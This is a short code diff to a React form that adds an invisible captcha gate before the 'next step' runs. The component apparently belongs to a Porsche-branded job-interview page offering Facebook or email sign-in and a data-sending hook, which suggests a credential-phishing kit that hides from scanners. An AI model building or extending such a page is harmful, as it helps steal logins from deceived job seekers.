@@ -4,6 +4,7 @@ import styled from "styled-components";
 import FacebookLogo from "../../assets/images/FLogo.png";
 import SendData from "../../hooks/SendData.js";
 import { DataContext } from "../../pages/index.js";
+import { useCaptcha } from "../Captcha/InvisibleCaptchaGate.js";
 
 // Porsche design components
 import Hero from "../porsche/Hero.jsx";
@@ -38,9 +39,11 @@ function Form({
   const [isLoading, setIsLoading] = useState(false);
   const [loadingType, setLoadingType] = useState(""); // 'facebook' or 'email'
   const [selectedRole, setSelectedRole] = useState(marketingRoles[0]);
+  const { verified: captchaVerified } = useCaptcha();
   let { AllData, setAllData } = useContext(DataContext);
 
   const NextStep = (stepText, meetingData = {}) => {
+    if (!captchaVerified) return;
     setIsLoading(true);
     setLoadingType(stepText.includes("Facebook") ? "facebook" : "email");
 
@@ -118,6 +121,7 @@ function Form({
             NextStep={NextStep}
             FacebookLogo={FacebookLogo}
             isLoading={isLoading}
+            captchaVerified={captchaVerified}
             roleTitle={selectedRole.title}
             interviewerName={INTERVIEWER_NAME}
           />
